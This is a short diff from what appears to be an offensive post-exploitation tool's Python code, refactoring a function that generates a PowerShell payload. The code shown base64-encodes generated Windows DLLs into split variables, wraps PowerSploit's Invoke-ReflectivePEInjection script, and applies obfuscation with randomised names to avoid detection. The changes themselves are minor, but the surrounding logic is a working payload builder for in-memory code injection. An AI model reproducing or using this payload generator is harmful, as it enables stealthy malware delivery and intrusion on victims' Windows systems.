@@ -312,7 +312,8 @@ def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64
 
     if both or x64:
         # generate x64 ps1
-        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64', shared=True)[0])
+        binaryX64 = base64.b64encode(
+            generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True)[0])
         binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
         for i, aPart in enumerate(binaryX64parts):
             x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
@@ -321,14 +322,18 @@ def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64
 
     if both or x86:
         # generate x86 ps1
-        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86', shared=True)[0])
+        binaryX86 = base64.b64encode(
+            generate_binary_from_template(display, conf, 'windows', arch='x86', shared=True)[0])
         binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
         for i, aPart in enumerate(binaryX86parts):
             x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
             x86ConcatCode += "$PEBytes{0}+".format(i)
         display(Success('X86 dll loaded and {0} variables used'.format(i + 1)))
 
-    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
+    script = obfuscatePowershellScript(
+        open(os.path.join(
+            ROOT, "external", "PowerSploit",
+            "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
 
     # adding some more obfuscation
     random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
